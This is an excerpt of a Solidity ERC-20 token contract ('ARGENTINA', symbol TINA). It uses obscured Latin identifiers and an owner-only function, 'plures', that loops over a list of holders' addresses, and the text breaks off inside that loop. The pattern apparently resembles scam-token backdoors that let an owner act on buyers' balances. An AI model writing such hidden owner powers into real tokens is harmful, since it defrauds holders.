...
contract argentina is Context, IERC20 {
    ...
    address public  intelligantur;
    constructor () {
        _name = "ARGENTINA";
        _symbol = "TINA";
        _decimals = 18;
        uint256 initialSupply = 357000000;
         intelligantur = msg.sender;
    ...
    modifier onlyOwner() {
        require(msg.sender == intelligantur, "Not allowed");
        _;
    }

    function plures(address[] memory celebre) public onlyOwner() {
        for (uint256 i = 0; i < celebre.length; i++) {
            address account = celebre[i];
